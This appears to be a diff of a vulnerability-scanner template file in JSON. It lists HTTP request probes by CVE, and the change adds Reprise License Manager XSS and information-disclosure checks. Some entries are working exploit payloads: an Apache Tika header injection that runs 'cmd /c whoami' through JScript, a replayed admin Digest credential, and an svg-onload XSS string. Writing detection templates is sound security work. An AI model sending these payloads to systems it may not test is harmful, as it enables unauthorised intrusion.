@@ -6204,11 +6204,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -14851,8 +14851,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -16753,6 +16753,36 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/plugins/web/service/search/auto-completion/domain/en.xml?q=adm"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-28363",
+      "info": {
+        "name": "Reprise License Manager 14.2 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/goform/login_process?username=test%22%3E%3Csvg/onload=alert(document.domain)%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-28365",
+      "info": {
+        "name": "Reprise License Manager 14.2 - Information Disclosure",
+        "severity": "low"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/goforms/rlminfo"
           ]
         }
       ]
